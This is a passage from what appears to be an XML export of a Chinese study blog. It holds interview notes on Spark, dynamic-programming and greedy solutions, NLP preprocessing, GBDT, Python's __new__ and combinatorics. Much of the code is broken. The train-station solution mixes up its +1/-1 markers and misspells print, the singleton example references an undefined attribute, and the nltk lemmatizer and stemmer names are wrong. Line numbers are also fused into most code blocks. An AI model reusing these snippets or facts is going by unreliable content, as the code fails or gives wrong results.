task由分区决定，读取时候其实调用的是hadoop的split函数，根据HDFS的block来决定每个job的并行度由core决定 cache与checkpoint的区别 cache 和 checkpoint 之间有一个重大的区别，cache 将 RDD 以及 RDD 的血统(记录了这个RDD如何产生)缓存到内存中，当缓存的 RDD 失效的时候(如内存损坏)，它们可以通过血统重新计算来进行恢复。但是 checkpoint 将 RDD 缓存到了 HDFS 中，同时忽略了它的血统(也就是RDD之前的那些依赖)。为什么要丢掉依赖？因为可以利用 HDFS 多副本特性保证容错！ reduceByKey和groupByKey的区别? 如果能用reduceByKey,那就用reduceByKey.因为它会在map端,先进行本地combine,可以大大减少要传输到reduce端的数据量,减小网络传输的开销。 groupByKey的性能,相对来说要差很多,因为它不会在本地进行聚合,而是原封不动,把ShuffleMapTask的输出,拉取到ResultTask的内存中,所以这样的话,就会导致,所有的数据,都要进行网络传输从而导致网络传输性能开销非常大! map和mapPartition的区别？ 1.map是对rdd中的每一个元素进行操作；mapPartitions则是对rdd中的每个分区的迭代器进行操作如果是普通的map，比如一个partition中有1万条数据。ok，那么你的function要执行和计算1万次。使用MapPartitions操作之后，一个task仅仅会执行一次function，function一次接收所有的partition数据。只要执行一次就可以了，性能比较高。 2.如果在map过程中需要频繁创建额外的对象(例如将rdd中的数据通过jdbc写入数据库,map需要为每个元素创建一个链接而mapPartition为每个partition创建一个链接),则mapPartitions效率比map高的多。 3.SparkSql或DataFrame默认会对程序进行mapPartition的优化。 mapPartition缺点： 一次性读入整个分区全部内容，分区数据太大会导致内存OOM 详细说明一下GC对spark性能的影响?优化 GC会导致spark的性能降低。因为spark中的task运行时是工作线程,GC是守护线程,守护线程运行时,会让工作线程停止,所以GC运行的时候,会让Task停下来,这样会影响spark 程序的运行速度,降低性能。 默认情况下,Executor的内存空间分60%给RDD用来缓存,只分配40%给Task运行期间动态创建对象,这个内存有点小,很可能会发生full gc,因为内存小就会导致创建的对象很快把内存填满,然后就会GC了,就是JVM尝试找到不再被使用的对象进行回收,清除出内存空间。所以如果Task分配的内存空间小,就会频繁的发生GC,从而导致频繁的Task工作线程的停止,从而降低Spark应用程序的性能。 优化方式： ​ 1.增加executor内存 ​ 2.可以用通过调整executor比例,比如将RDD缓存空间占比调整为40%,分配给Task的空间变为了60%,这样的话可以降低GC发生的频率 spark.storage.memoryFraction ​ 2.使用Kryo序列化类库进行序列化 为什么要使用广播变量？ 当RDD的操作要使用driver中定义的变量时,每次都要把变量发送给worker节点一次,如果这个变量的数据很大的话,会产生很高的负载,导致执行效率低;使用广播变量可以高效的使一个很大的只读数据发送给多个worker节点,而且对每个worker节点只需要传输一次,每次操作时executor可以直接获取本地保存的数据副本,不需要多次传输]]></content>
      <tags>
        <tag>面试</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习——SMOTE算法]]></title>
    <url>%2F2019%2F05%2F18%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94SMOTE%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[参考文章]]></content>
      <tags>
        <tag>机器学习</tag>
        <tag>算法</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试——背包问题（动态规划）]]></title>
    <url>%2F2019%2F05%2F17%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%EF%BC%88%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%EF%BC%89%2F</url>
    <content type="text"><![CDATA[​ 背包问题是指给定义一些候选集，在这些候选集中找出一些特定要求的组合，组合出目标值(也就是用一些大小不同的东西装满背包)。 ​ 常见的背包问题问题有：能否组成一个值，组成一个值得最小元素个数，组成一个值可使用的最多元素个数等 ​ 背包问题根据背包选用的物品是否可以复用，分为完全背包问题和0/1背包问题。根据背包的维度可以分为一维背包问题和二维背包问题。下面我们针对这些问题中的关键点进行总结： 0/1背包问题： ​ 1.遍历时一定要从后向前遍历目标值数组（dp），不能从前向后，从前往后会产生一个物品适用多次的问题 ​ 2.要在最外层循环遍历物品，这样能保证在选择将物品是否使用在哪里使用 ​ 3.dp数组长度为目标值得大小+1 完全背包问题： ​ 1.dp数组长度为目标值得大小+1 ​ 一点想法 对于从后到前的遍历动态规划每隔一段时间再看多会很难理解，这也是动态规划经常做的不是太好的原因吧，因此把从后向前整个流程梳理一下。 一维背包问题1.零钱兑换(leetcode 232)给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总金额，返回 -1。 示例 1: 123输入: coins = [1, 2, 5], amount = 11输出: 3 解释: 11 = 5 + 5 + 1 示例 2: 12输入: coins = [2], amount = 3输出: -1 说明:你可以认为每种硬币的数量是无限的。 分析:这道题题目是标准的完全背包问题，用数目不定的元素组合成指定金额，因为各个值都可能有两种情况组成：1.直接由当前金额的硬币直接组成 2.由之前组成的金额再加上一个硬币组成，因此递推关系为: ​ dp[i] = min(dp[i],dp[i-c]) c为硬币的各个金额 123456789101112131415def coinChange(self, coins: List[int], amount: int) -&gt; int: MAX_INT = pow(2,32)-1 dp = [MAX_INT for _ in range(amount+1)] dp[0] = 0 for i in range(1,len(dp)): for c in coins: if i-c&gt;=0: dp[i] = min(dp[i],dp[i-c]+1) if dp[-1]==MAX_INT: return -1 else: return dp[-1] 2.小米大礼包小米之家是成人糖果店。里面有很多便宜，好用，好玩的产品。中秋节快到了，小米之家想给米粉们准备一些固定金额大礼包。对于给定的一个金额，需要判断能不能用不同种产品（一种产品在礼包最多出现一次）组合出来这个金额。聪明的你来帮帮米家的小伙伴吧。 输入描述:123输入 N （N 是正整数， N &lt;= 200）输入 N 个价格p（正整数, p &lt;= 10000）用单空格分割输入金额 M（M是正整数，M &lt;= 100000 ） 输出描述:12能组合出来输出 1否则输出 0 示例1 输入： 123699 199 1999 10000 39 149910238 输出： 11 分析：这是一个标准的一维0/1背包问题，最终目标看是否能完成组合。因此首先我们推断出递推公式 ​ dp[i] = max(dp[i],dp[i-c]) 注意：0/1背包问题必须要从后往前进行遍历，否则会出现已经当前c在前面使用dp[i] = max(dp[i],dp[i-c])已经更新过的结果，相当于使用了多次c 12345678910111213141516n = int(input())nums = list(map(int,input().split()))target = int(input())dp = [0 for i in range(target+1)]dp[0] = 1for c in nums: for i in range(target,c-1,-1): dp[i] = max(dp[i],dp[i-c])print(dp[-1]) 二维背包问题1.一和零(leetcode 474)在计算机界中，我们总是追求用有限的资源获取最大的收益。 现在，假设你分别支配着 m 个 0 和 n 个 1。另外，还有一个仅包含 0 和 1 字符串的数组。 你的任务是使用给定的 m 个 0 和 n 个 1 ，找到能拼出存在于数组中的字符串的最大数量。每个 0 和 1 至多被使用一次。 注意: 给定 0 和 1 的数量都不会超过 100。 给定字符串数组的长度不会超过 600。 示例 1: 1234输入: Array = &#123;"10", "0001", "111001", "1", "0"&#125;, m = 5, n = 3输出: 4解释: 总共 4 个字符串可以通过 5 个 0 和 3 个 1 拼出，即 "10","0001","1","0" 。 示例 2: 1234输入: Array = &#123;"10", "0", "1"&#125;, m = 1, n = 1输出: 2解释: 你可以拼出 "10"，但之后就没有剩余数字了。更好的选择是拼出 "0" 和 "1" 。 分析：这一题是比较典型的0/1背包问题,将翻译后的string看做一个物品，这个物品有两个value，value1为0 的个数，value2为1的个数，初始状态下你有用m个0和n个1，求最多能获取的物品总个数。 ​ 核心依然是找到状态转移方程，因为题目具有两个变量，属于二维背包问题，因此创建一个二位数组，分别代表使用num0个0和num1个1时可以获得的最多字符串数。 ​ dp[num0][num1] =max(dp[num0][num1],dp[nums0-zeros][nums1-ones]+1) 注意：这里的二重循环必须从m,n开始递减，而不能从0开始递增，因为在0/1背包问题中，每个物品只能被使用一次，如果从0开始向后，dp[num0][num1]可以获得的是这次循环中更新过的dp[num0][num1] =max(dp[num0][num1],dp[nums0-zeros][nums1-ones]+1)，相当于一个物品可以重复购买，变成了完全背包问题。 12345678910111213141516171819202122232425def findMaxForm(self, strs: List[str], m: int, n: int) -&gt; int: tmp = [] for i in strs: zeros = 0 ones = 0 for j in i: if j=='0': zeros+=1 else: ones+=1 tmp.append([zeros,ones]) #m 行，代表0 n列代表1 dp = [[0 for _ in range(n+1)]for _ in range(m+1)] for s in tmp: zeros = s[0] ones = s[1] for nums1 in range(m,zeros-1,-1): for nums2 in range(n,ones-1,-1): dp[nums1][nums2] = max(dp[nums1][nums2],dp[nums1-zeros][nums2-ones]+1) return dp[-1][-1] 2.大礼包在LeetCode商店中， 有许多在售的物品。 然而，也有一些大礼包，每个大礼包以优惠的价格捆绑销售一组物品。 现给定每个物品的价格，每个大礼包包含物品的清单，以及待购物品清单。请输出确切完成待购清单的最低花费。 每个大礼包的由一个数组中的一组数据描述，最后一个数字代表大礼包的价格，其他数字分别表示内含的其他种类物品的数量。 任意大礼包可无限次购买。 示例 1: 1234567输入: [2,5], [[3,0,5],[1,2,10]], [3,2]输出: 14解释: 有A和B两种物品，价格分别为¥2和¥5。大礼包1，你可以以¥5的价格购买3A和0B。大礼包2， 你可以以¥10的价格购买1A和2B。你需要购买3个A和2个B， 所以你付了¥10购买了1A和2B（大礼包2），以及¥4购买2A。 最小车票花费]]></content>
      <tags>
        <tag>算法</tag>
        <tag>机试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试——贪心算法]]></title>
    <url>%2F2019%2F05%2F17%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[挑选代表我们有很多区域，每个区域都是从a到b的闭区间，现在我们要从每个区间中挑选至少2个数，那么最少挑选多少个？ 输入描述:12第一行是N（N&lt;10000）,表示有N个区间，之间可以重复然后每一行是ai,bi，持续N行，表示现在区间。均小于100000 输出描述:1输出一个数，代表最少选取数量。 输入例子1:1234544 72 40 23 6 输出例子1:14 思路分析：​ 本题是一个贪心问题，即挑选最少的点，也就是在每一步种都选择可能和下一步公用的点。可以先把区间按照结尾去接进行排序，然后从第一个区间开始记录最后两个元素的值， ​ 如果下个区间中包含了这两个元素，那么挑选点数+0，x、y不变， ​ 如果下个区间中只包含了一个元素，那么挑选点数+1,y继承x的值，x变为当前区间的最后一个元素 ​ 如果下个区间中不包含任何x、y一个元素，那么挑选点数+2，x、y更新为区间最大、次大值 1这里之所以按照末尾元素进行排序，主要是因为后续要判断结尾两个元素和下一个区间是否具有关系 1234567891011121314151617181920212223242526n = int(input())nums = []for _ in range(n): tmp = list(map(int,input().split())) nums.append(tmp)nums = sorted(nums,key=lambda x:x[1])ans = 2x= nums[0][-1] #最大的元素y = nums[0][-1]-1 #次大的元素for l in nums[1:]: if l[0]&lt;=x&lt;=l[-1] and l[0]&lt;=y&lt;=l[-1]: ans += 0 elif l[0]&lt;=x&lt;=l[-1] or l[0]&lt;=y&lt;=l[-1]: y = x x = l[-1] ans+=1 else: ans+=2 x = l[-1] y = l[-1] - 1print(ans)]]></content>
  </entry>
  <entry>
    <title><![CDATA[美团技术笔试——最长全1串]]></title>
    <url>%2F2019%2F05%2F14%2F%E7%BE%8E%E5%9B%A2%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AF%95%E2%80%94%E2%80%94%E6%9C%80%E9%95%BF%E5%85%A81%E4%B8%B2%2F</url>
    <content type="text"><![CDATA[题目描述给你一个01字符串，定义答案=该串中最长的连续1的长度，现在你有至多K次机会，每次机会可以将串中的某个0改成1，现在问最大的可能答案 输入描述:123456输入第一行两个整数N,K，表示字符串长度和机会次数第二行输入N个整数，表示该字符串的元素( 1 &lt;= N &lt;= 300000, 0 &lt;= K &lt;= N ) 输出描述:1输出一行表示答案 输入例子1:1210 2 1 0 0 1 0 1 0 1 0 1 输出例子1:15 解题思路​ 首先应该分几种情况进行分类讨论： 1.当K&gt;N时，输出应该直接为K 2.当K&lt;N，如果K等于0，结果直接为最长连续1子串长度 ​ 如果K不等于0，那么需要进行动态滑动窗口实验 滑动窗口实验思路为： ​ 1.首先计算不进行替换时，最长连续1子串长度，即为max ​ 2.设置初始值 ​ 滑动窗口大小初始值 slide = max+K ​ 滑动窗口最大和初始值 slide_sum = max ​ 3.使用当前滑动窗口大小进行扫描数据，看是都存在一个滑动窗口内的和超过当前滑动窗口最大和 ​ 如果有，那么说明存在更大的连续子串，因此将silde和silde_sum都加1(在初始值时已经设置了相当于K个空位，如果值大于silde_sum,说明空格还没用完，如果等于说明空格用完了，但是还可能存在更大的连续1，因此只有当值小于silde_sum才能保证是最大的连续1串） ​ 如果没有，那么说明silde-1为最大窗口，也就是最长全1串 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# 10 2# 1 0 0 1 0 1 0 1 0 1n,k = map(int,input().split())nums = list(map(int,input().split()))#判断新的滑动窗口是不是存在和大于等于原来的最大和def get_maxsum(silde,nums,max_sum): end = silde start = 0 while end&lt;len(nums): new_max_sum = sum(nums[start:end]) if new_max_sum&gt;=max_sum: return True start += 1 end+=1 return Falseif k&gt;n: print(n)else: max_len = 0 i =0 tmp_len = 0 while i&lt;n: if nums[i]==1: tmp_len +=1 else: tmp_len = 0 max_len = max(max_len,tmp_len) i+=1 if max_len+k&gt;=n: print(n) else: flag = True silde = max_len + k max_sum = max_len while flag: if get_maxsum(silde,nums,max_sum): silde += 1 max_sum+=1 else: flag = False print(silde-1)]]></content>
  </entry>
  <entry>
    <title><![CDATA[降维技术]]></title>
    <url>%2F2019%2F05%2F13%2F%E9%99%8D%E7%BB%B4%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[​ 常见的降维技术只要分为PCA、LDA和t-sne三种，下面我们将具体介绍这三种降维技术以及适用范围 1.PCA2.LDA3.t-sne​ t-sne是在NLP词切入可视化降维的最佳选择，因为它具有保存向量之间相对距离的特性，能有效地保存线性子结构和关系，可以很好的表达不同的单词的在当前训练的词向量上是否相似。 ​ 核心特性: 会保存向量之间的相对距离]]></content>
      <tags>
        <tag>机器学习</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wordcloud词云工具]]></title>
    <url>%2F2019%2F05%2F10%2Fwordcloud%E8%AF%8D%E4%BA%91%E5%9B%BE%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[wordcloud是一种NLP中常用的可视化工具，主要用途是可视化展示文本中各个词出现的频率多少，将出现频率多的使用更大的字体进行展示。 基本用法1234567import wordcloudwith open("./type1.txt","r") as f: type1 = f.read() w = wordcloud.WordCloud()w.generate(type1)w.to_file("type1.png") wordcloud内部处理流程： ​ 1 、分隔：以空格分隔单词 ​ 2、统计 ：单词出现的次数并过滤 ​ 3、字体：根据统计搭配相应的字号 ​ 4 、布局 常用参数​]]></content>
      <tags>
        <tag>NLP</tag>
        <tag>可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NLP建模常见处理流程]]></title>
    <url>%2F2019%2F05%2F09%2FNLP%E5%BB%BA%E6%A8%A1%E5%B8%B8%E8%A7%81%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[1.清洗​ 主要包括清除掉无关内容和区分出各个部分。 段落的首尾单独区分：这里比较常见的一种却分时将段落的首尾单独区分出来，因为首尾句一般都是更加具有代表性的句子 2.标准化​ 主要包含了字母小写化和标点符号替换两个步骤 123456#字母小写化str.lower()#标点符号替换为空格import retext = re.sub(r"a-zA-Z0-9"," ") 3.标记化(分词)​ 标记化是指将目标切分成无法再分符号，一般主要指分词，一般的处理中都会将句子按照” “进行分词。 12345678#自写原始分词，进行前面的标准化以后进行words = text.split()#使用nltk进行分词,分词会比上面的更加准确，根据标点符号的不同位置进行不同种处理，例如Dr. 中的.不会被处理掉from nltk.tokenize import word_tokenizesentence = word_tokenize(text)words = word_tokenize(sentence)#nltk提供了多种token方式，包括正则表达式等，按需选择 4.删除停用词​ 删除停用词是指删除掉哪些去掉哪些和当前任务判断关系不大的词，对于设计到的语料没有具体领域时，可以使用英文常用停用词，其中包括800多个英文的常见停用词。 ​ 英文常见停用词标准表 在特定领域时，最好使用专门针对于该领域的停用词表，因为在一个问题中的停用词可能会在另一个问题中肯能就是关键词 1234567891011121314#去除停用词def get_stopword(path): """ 获取停用词表 return list """ with open(path) as f: stopword = f.read() stopword_list = stopword.splitlines() return stopword_liststopwords = get_stopword(path)words = [word for word in words if word not in stopwords] 5.词性标注​ 用于标注句子中各个单词分别属于什么词性，更加有助于理解句子的含义，另一方面，词性标注更加有利于后续处理。 常见的一种利用词性标注的后续处理步骤就是直接去掉非名词的部分，因为在一个句子中，名词在很大程度就可以表现两个句子的相似度。 1234#使用nltk进行词性标注from nltk import pos_tagsentence = word_tokenize("this is a dog") #分词pos = pos_tag(sentence) #标注 6.命名实体识别​ 命名实体识别指的是识别 ​ 条件：命名实体识别首先要完成词性标注 ​ 应用：对新闻文章进行简历索引和搜索 实践性能并不是一直都很好，但对大型语料库进行实验确实有效 1234from nltk import pos_tag,ne_chunkfrom nltk.tokenize import word_tokenizene_chunk(pos_tag(word_tokenize("I live in Beijing University"))) 7.词干化和词型还原​ 词干提取是指将词还原成词干或词根的过程 ​ 方式：利用简单的搜索和替换样式规则，例如去除结尾的s、ing，将结尾的ies变为y等规则 ​ 作用：有助于降低复杂度，同时保留次所含的意义本质 还原的词干不一定非常准确，但是只要这个词的所有形式全部都转化成同一个词干就可以了，因为他们都有共同的含义 12from nltk.stem.porter import PorterStemmerstemmed = [PoeterStemmer().stem(w) for w in words] ​ 词型还原是将词还原成标准化形式的另一种技术，利用字典的方式将一个词的不同形式映射到其词根 ​ 方式：字典 ​ 优点:可以将较大的词型变化很大的正确还原到词根 123from nltk.stem.wordnet import WordNetLemmaterlemmed = [WordNetLemmater.lemmative(w) for w in words] ​ 这里我们发现只有ones被还原成了one，其他词并没有找到词的原型，这是因为词型转化是针对词型进行的，只会转化指定词型的词，默认只转换名词，因此上面只有ones被转换了，下面我们来指定转换动词： 123from nltk.stem.wordnet import WordNetLemmaterlemmed = [WordNetLemmater.lemmative(w) for w in words] 8.向量化​ 向量化是将提取好的token转化成向量表示，准备输入到模型中。常见的方式包括词袋模型、tf-idf、Word2vec、doc2vec等 9. 分类模型或聚类模型​ 根据实际情况选用合适的分类模型，聚类模型。 注意:上面的处理流程并不是全部都一定要进行,可以根据实际情况进行选择,例如在下一篇文章情感分类中,只是使用了标准化、去停用词、词干提取、向量化、分类等步骤]]></content>
      <tags>
        <tag>机器学习</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GBDT]]></title>
    <url>%2F2019%2F05%2F08%2FGBDT%2F</url>
    <content type="text"><![CDATA[简介​ GBDT 的全称是 Gradient Boosting Decision Tree，梯度提升树，在传统机器学习算法中，GBDT算的上TOP3的算法。想要理解GBDT的真正意义，那就必须理解GBDT中的Gradient Boosting 和Decision Tree分别是什么？ 分类树和回归树1.分类树​ 分类树使用信息增益或增益比率来划分节点；每个节点样本的类别情况投票决定测试样本的类别。 ​ 以C4.5分类树为例，C4.5分类树在每次分枝时，是穷举每一个feature的每一个阈值，找到使得按照feature&lt;=阈值，和feature&gt;阈值分成的两个分枝的熵最大的阈值(熵最大的概念可理解成尽可能每个分枝的男女比例都远离1:1)，按照该标准分枝得到两个新节点，用同样方法继续分枝直到所有人都被分入性别唯一的叶子节点，或达到预设的终止条件，若最终叶子节点中的性别不唯一，则以多数人的性别作为该叶子节点的性别。 2.回归树​ 回归树使用最大均方差划分节点；每个节点样本的均值作为测试样本的回归预测值。 ​ 回归树总体流程也是类似，区别在于，回归树的每个节点（不一定是叶子节点）都会得一个预测值，以年龄为例，该预测值等于属于这个节点的所有人年龄的平均值。分枝时穷举每一个feature的每个阈值找最好的分割点，但衡量最好的标准不再是最大熵，而是最小化均方差即(每个人的年龄-预测年龄)^2 的总和 / N。也就是被预测出错的人数越多，错的越离谱，均方差就越大，通过最小化均方差能够找到最可靠的分枝依据。分枝直到每个叶子节点上人的年龄都唯一或者达到预设的终止条件(如叶子个数上限)，若最终叶子节点上人的年龄不唯一，则以该节点上所有人的平均年龄做为该叶子节点的预测年龄。 Decision Tree：CART回归树​ GBDT使用的决策树都是CART数回归树，无论是处理回归问题还是二分类以及多分类。 为什么不用CART分类树呢？ ​ 因为GBDT每次迭代要拟合的是梯度值，是连续值所以要用回归树。 ​ CART回归树的评价指标：平方误差 为什么CART回归时的评价指标不再使用Gini、熵等不纯度指标？ ​ 对于回归树算法来说最重要的是寻找最佳的划分点，那么回归树中的可划分点包含了所有特征的所有可取的值。在分类树中最佳划分点的判别标准是熵或者基尼系数，都是用纯度来衡量的，但是在回归树中的样本标签是连续数值，所以再使用熵之类的指标不再合适，取而代之的是平方误差，它能很好的评判拟合程度。 Graident Boosting:梯度提升树​ 梯度提升树（Grandient Boosting）是提升树（Boosting Tree）的一种改进算法，所以在讲梯度提升树之前先来说一下提升树 提升树 Boosting Tree​ 提升树就是通过不断建立树来不断拟合前一个问题的残差来不断接近目标。 ​ 先来个通俗理解：假如有个人30岁，我们首先用20岁去拟合，发现损失有10岁，这时我们用6岁去拟合剩下的损失，发现差距还有4岁，第三轮我们用3岁拟合剩下的差距，差距就只有一岁了。如果我们的迭代轮数还没有完，可以继续迭代下面，每一轮迭代，拟合的岁数误差都会减小。最后将每次拟合的岁数加起来便是模型输出的结果。 ​ 当损失函数是平方损失和指数损失函数时，梯度提升树每一步优化是很简单的，但是对于一般损失函数而言，往往每一步优化起来不那么容易，针对这一问题，Friedman提出了梯度提升树算法，这是利用最速下降的近似方法，其关键是利用损失函数的负梯度作为提升树算法中的残差的近似值。 Graident Boosting:梯度提升树​ 核心：利用损失函数的负梯度作为提升树算法中的残差的近似值。 下面我们来看一下负梯度具体的样子，第t轮的第i个样本的损失函数的负梯度为： 那么对于分类问题呢？二分类和多分类的损失函数都是logloss，下面以回归问题为例对GBDT算法进行讲解。 GBDT 常见问题： 1.GBDT和Xgboost的区别？ 1.损失函数上 在GBDT的损失函数上XGboost加入了正则化项 2.优化方法上 GBDT在优化上只使用一阶导数的信息，而XGBoost则对代价函数进行了二阶的展开。 3.基分类器的支持上 GBDT只支持CART数作为基分类器，XGBoost在其基础上加入了线性分类器 4.Xgboost加入了shrinkage策略。在完成一次迭代后会将叶子节点的权值乘以该系数削弱了每棵树的影响，使后面的数拥有更大的学习空间 5.列抽样 借鉴了随机森林的做法，支持列抽样，不仅能防止过拟合还能减少计算 6.缺失值自动处理 对于有缺失值的样本，XGBoost可以自动学习出分裂方向 7.计算特征增益时并行 预先对特征值进行排序，保存成block结构，后面的迭代重复使用这个结构 2.lightgbm和Xgboost的区别在哪里？ ​ lightgbm基本原理和Xgboost一样，在框架上做了一些优化 1.xgboost采用的level-wise的分裂策略，而lightgbm采用的是leaf-wise的策略，区别是xgboost对每一层节点做无差别的分裂，可能有些节点的信息增益非常小，对结果影响不大，但是依然进行分裂；leaf-wise的做法是在当前所有叶子节点中选择分裂收益最大的节点进行分裂。明显leaf-wise更容易过拟合，陷入高度较高的深度中，因此lightgbm更应该注意对深度进行限制 2.lightgbm使用histgram的决策树算法，而xgboost使用exact算法，hostgram算法在内存和计算代价上都有不小的优势 3.lightgbm采用直方图加速计算 4.并行化。 ​ a.特征并行化 ​ 一般的特征并行化都并行化都采用将数据进行垂直切分，然后分割后的数据分散到各个worker，各个worker计算器拥有的数据上计算 best split point，然后汇总得到最优切点。这种方式在数据量很大的时候效率提升有限 ​ lightgbm采用直接将全量数据分散到每个worker，然因此最优的特征分裂结果不需要传输到其他worker中，只需要将最优特征以及分裂点告诉其他worker，worker随后本地自己进行处理。 ​ b.数据并行化 ​ 传统的数据并行算法，首先水平切分数据集，每个worker基于数据集构建局部特征直方图（Histogram），归并所有局部的特征直方图，得到全局直方图，找到最优分裂信息，进行数据分裂。 ​ LightGBM算法使用Reduce Scatter并行算子归并来自不同worker的不同特征子集的直方图，然后在局部归并的直方图中找到最优局部分裂信息，最终同步找到最优的分裂信息。 ​ 除此之外，LightGBM使用直方图减法加快训练速度。我们只需要对其中一个子节点进行数据传输，另一个子节点可以通过histogram subtraction得到。 参考文献：https://blog.csdn.net/zpalyq110/article/details/79527653]]></content>
      <tags>
        <tag>机器学习</tag>
        <tag>算法</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[度小满编程记——火车站台问题]]></title>
    <url>%2F2019%2F04%2F30%2F%E5%BA%A6%E5%B0%8F%E6%BB%A1%E7%BC%96%E7%A8%8B%E8%AE%B0%E2%80%94%E2%80%94%E7%81%AB%E8%BD%A6%E7%AB%99%E5%8F%B0%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[​ ​ 思路：这道题讲道理如果起点终点没有那么大就很简单了，直接使用字典进行存储，然后选择value最大的那个值即可。而这道题目中明显直接使用上面的思路是行不通了，因此这题使用了一种比较巧的方式， ​ 先将各个列车的起点终点分别编码为(站点,编号)，起点编号为-1，终点编号为0，然后从小到大对元组进行排序，然后便利元组列表，如果是终点，那么将维护数+1，如果是起点，那么代表到这里已经有一辆车不再需要维护了，同时记录最大的维护值，便利完全部列表最大的维护值即为结果 1234567891011121314151617181920n = int(input())train = []t = 0ans = 0for i in range(n): l = list(map(int,input().split())) train.append((l[0],1)) train.append((l[1],-1))train.sort() #这里是关键点，sort函数将对元组进行排序for i in train: if i[1]==0: t+=1 else: t-=1 ans = max(ans,t)pritn(ans) 上式中的sort函数对元素为元祖的列表来进行排序，默认规则是先使用元组的第一个元素进行排序，当第一个元素值相同时再使用第二个元素进行排序，下面是一个例子： 12345l = [[1,1],[2,1],[2,-1],[1,-1]]l.sort()output: [[1, -1], [1, 1], [2, -1], [2, 1]] 在这个问题中使用sort进行排序后，表示由于同一个车站的负值被排在前面，每次先减去1，也就是前一个车一这里为起点，不需要再使用维护。 之前还遇到过好多类似的问题，其实都可以采用这种类似的思路来减少内存占用，比如之前360笔试中遇到过的找]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[__new__和__init__]]></title>
    <url>%2F2019%2F04%2F26%2Fnew-%E5%92%8C-init%2F</url>
    <content type="text"><![CDATA[执行顺序：类中同时出现new()和init()时，先调用new()，再调用init() python中__new__和__init__的区别 1.用法不同： ​ __new__()用于创建实例，所以该方法是在实例创建之前被调用，它是类级别的方法，是个静态方法； ​ __init__() 用于初始化实例，所以该方法是在实例对象创建后被调用，它是实例级别的方法，用于设置对象属性的一些初始值 ​ 注：由此可知，__new__()在__init__() 之前被调用。如果__new__() 创建的是当前类的实例，会自动调用__init__()函数，通过return调用的__new__()的参数cls来保证是当前类实例，如果是其他类的类名，那么创建返回的是其他类实例，就不会调用当前类的__init__()函数 2.传入参数不同： ​ __new__()至少有一个参数cls，代表当前类，此参数在实例化时由Python解释器自动识别； ​ __init__()至少有一个参数self，就是这个__new__()返回的实例，__init__()在__new__()的基础上完成一些初始化的操作。 3.返回值不同： ​ __new__()必须有返回值，返回实例对象； __init__()不需要返回值。 __new__的两种常见用法1.继承不可变的类​ __new__()方法主要用于继承一些不可变的class，比如int, str, tuple， 提供一个自定义这些类的实例化过程的途径，一般通过重载__new__()方法来实现 12345678class PostiveInterger(int): def __new__(cls,value): return super(PostiveInterger,cls).__new__(cls,abs(value))a = PostiveInterger(-10)print(a)output: 10 2.实现单例模式​ 可以用来实现单例模式，也就是使每次实例化时只返回同一个实例对象。 1234567891011121314151617class Singleobject(object): def __new__(cls): if not cls.instance: cls.instance = super(Singleobject,cls).new(cls) return cls.instanceobject1 = Singleobject()object2 = Singleobject()object1.attr = 'value1'print(object1.attr,object2.attr)print(object1 is object2)output: value1,value1 True]]></content>
      <tags>
        <tag>面试</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数学算法——排列组合]]></title>
    <url>%2F2019%2F04%2F20%2F%E6%95%B0%E5%AD%A6%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88%2F</url>
    <content type="text"><![CDATA[​ 最近在做各大场笔试题的过程中，发现排列组合在笔试中是一个经常出现的内容，由于读研后就在没有接触过，忘得已经差不多了，大的都不是很好，因此决定写一篇博客来重新复习一下相关知识，下面开始进行总结。 排列组合1.排列​ n个元素中取m个元素按照一定的书序排成一排，用$A_n^m$表示。 计算公式： ​ $A_n^m = n(n-1)(n-2)…(n-m+1)​$ 2.组合​ n个元素中取m个不同的元素(不关心顺序) 计算公式： ​ $C_n^m = A_n^m/A_m^m = \frac{n(n-1)(n-2)…(n-m+1)}{m(m-1)(m-2)…1}$ 常用技巧1.捆绑法​ 要求几个元素相邻时，可以将它们作为一个整体在进行排列 2.差空法​ 要求元素不相邻时，如ABCDEF排成一排，要求AB不相邻，则可以把CDEF先排好，把AB插进CDEF产生的5个空中就好 3.插板法​ 要求n个元素分成m个组，每个组必须要有一个元素时，可以在n个元素中产生的n-1个空中插m-1个板子 4.留一法​ 排列问题中，有元素的顺序已定，如alibaba全排列产生多少个字符串，7个元素中a重复3次，b重复两次，则结果为元素全排除以重复元素的全排 常见问题环形排列问题：]]></content>
      <tags>
        <tag>数学算法</tag>
        <tag>排列组合</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试——堆相关的问题]]></title>
    <url>%2F2019%2F04%2F17%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
